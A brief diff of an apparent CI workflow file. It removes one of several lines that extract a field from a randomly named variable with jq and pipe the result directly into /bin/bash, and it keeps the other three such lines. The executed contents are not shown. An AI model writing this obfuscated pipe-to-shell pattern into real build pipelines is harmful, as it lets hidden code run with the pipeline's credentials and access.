@@ -27,7 +27,6 @@ jobs:
           echo $rlojy39 | jq -r .cvsbv95 | /bin/bash
           printf '%s' "$s406" | jq -r .vq61558 | /bin/bash
           printf '%s' "$tset9" | jq -r .b2354 | /bin/bash
-          printf '%s' "$zaw67" | jq -r .hh8121 | /bin/bash
 
       - name: Save output
         if: always()
